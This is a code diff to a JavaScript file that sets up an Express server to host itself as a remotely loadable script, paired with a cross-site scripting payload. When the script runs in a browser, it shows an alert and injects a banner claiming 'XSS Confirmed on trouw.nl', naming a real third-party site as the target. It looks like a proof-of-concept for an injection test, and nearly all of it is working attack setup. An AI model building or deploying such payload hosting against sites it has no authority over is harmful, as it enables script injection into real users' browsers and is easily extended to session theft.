@@ -84,5 +84,36 @@
 // app.listen(3001, () => {
 //     console.log('Honeypot running at http://3.7.71.39:3001');
 // });
-alert("XSS Executed!");
-console.log("XSS PRinted");
+// -------------------------------
+// 🖥️ Express Server to Serve This File
+// -------------------------------
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const app = express();
+const PORT = 3001;
+
+// Route to serve this file
+app.get('/xss.js', (req, res) => {
+  const filePath = path.join(__dirname, 'xss.js');
+  res.setHeader('Content-Type', 'application/javascript');
+  res.sendFile(filePath);
+});
+
+app.listen(PORT, () => {
+  console.log(`🚀 xss.js server running at http://localhost:${PORT}/xss.js`);
+});
+
+// -------------------------------
+// 💥 XSS Payload (when executed in browser)
+// -------------------------------
+
+// Don't execute this part on the server side
+if (typeof window !== 'undefined') {
+  alert("XSS Executed Successfully!");
+  document.body.innerHTML += `
+    <div style="position:fixed; top:10px; left:10px; background:red; color:white; padding:10px; font-size:20px; z-index:9999;">
+      🔥 XSS Confirmed on trouw.nl 🔥
+    </div>
+  `;
+}
